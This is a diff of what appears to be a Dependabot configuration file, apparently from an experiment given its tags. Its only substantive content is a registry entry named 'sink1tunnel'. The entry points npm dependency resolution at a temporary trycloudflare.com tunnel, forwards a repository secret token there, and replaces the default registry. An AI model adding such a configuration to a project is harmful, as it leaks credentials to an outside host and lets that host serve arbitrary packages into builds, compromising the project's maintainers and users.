@@ -1,9 +1,9 @@
-# p7r p11b_11_5 1790589582
+# p7r p11b_11_ctrl 1790589707
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/chain
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/echo
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
